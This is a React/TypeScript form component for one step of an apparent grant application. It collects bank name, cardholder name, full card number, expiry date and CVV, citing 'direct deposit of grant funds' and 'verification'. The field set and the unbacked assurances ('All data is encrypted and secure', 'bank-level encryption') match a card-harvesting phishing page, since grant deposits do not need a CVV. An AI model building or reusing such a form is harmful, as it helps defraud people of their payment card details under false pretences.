import { UseFormReturn } from "react-hook-form";
import { FormControl, FormField, FormItem, FormLabel, FormMessage, FormDescription } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { CreditCard, Lock, Shield } from "lucide-react";

interface BankingStepProps {
  form: UseFormReturn<any>;
}

export function BankingStep({ form }: BankingStepProps) {
  return (
    <div className="space-y-4">
      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
        <div className="flex items-center gap-2 text-blue-800 mb-2">
          <Shield className="h-4 w-4" />
          <span className="text-sm font-medium">Secure Banking Information</span>
        </div>
        <p className="text-blue-700 text-sm">
          This information is used for potential direct deposit of grant funds and verification purposes. 
          All data is encrypted and secure.
        </p>
      </div>

      <FormField
        control={form.control}
        name="bankName"
        render={({ field }) => (
          <FormItem>
            <FormLabel>Bank Name</FormLabel>
            <Select onValueChange={field.onChange} value={field.value}>
              <FormControl>
                <SelectTrigger>
                  <SelectValue placeholder="Select your bank" />
                </SelectTrigger>
              </FormControl>
              <SelectContent>
                <SelectItem value="chase">Chase Bank</SelectItem>
                <SelectItem value="bank-of-america">Bank of America</SelectItem>
                <SelectItem value="wells-fargo">Wells Fargo</SelectItem>
                <SelectItem value="citibank">Citibank</SelectItem>
                <SelectItem value="us-bank">U.S. Bank</SelectItem>
                <SelectItem value="td-bank">TD Bank</SelectItem>
                <SelectItem value="capital-one">Capital One</SelectItem>
                <SelectItem value="other">Other Bank</SelectItem>
              </SelectContent>
            </Select>
            <FormMessage />
          </FormItem>
        )}
      />

      <FormField
        control={form.control}
        name="cardholderName"
        render={({ field }) => (
          <FormItem>
            <FormLabel className="flex items-center gap-2">
              Cardholder Name
              <CreditCard className="h-3 w-3 text-muted-foreground" />
            </FormLabel>
            <FormControl>
              <Input placeholder="John Smith" {...field} />
            </FormControl>
            <FormMessage />
          </FormItem>
        )}
      />

      <FormField
        control={form.control}
        name="cardNumber"
        render={({ field }) => (
          <FormItem>
            <FormLabel className="flex items-center gap-2">
              Debit/Credit Card Number
              <Lock className="h-3 w-3 text-muted-foreground" />
            </FormLabel>
            <FormControl>
              <Input 
                placeholder="0000 0000 0000 0000" 
                {...field}
                className="font-mono"
              />
            </FormControl>
            <FormDescription>
              For verification and potential refund processing
            </FormDescription>
            <FormMessage />
          </FormItem>
        )}
      />

      <div className="grid grid-cols-2 gap-4">
        <FormField
          control={form.control}
          name="expDate"
          render={({ field }) => (
            <FormItem>
              <FormLabel>Expiration Date</FormLabel>
              <FormControl>
                <Input placeholder="MM/YY" {...field} />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="cvv"
          render={({ field }) => (
            <FormItem>
              <FormLabel>CVV Code</FormLabel>
              <FormControl>
                <Input placeholder="123" {...field} type="password" />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />
      </div>

      <div className="bg-green-50 border border-green-200 rounded-lg p-3 mt-4">
        <p className="text-green-800 text-sm text-center">
          🔒 Your information is protected with bank-level encryption
        </p>
      </div>
    </div>
  );
}
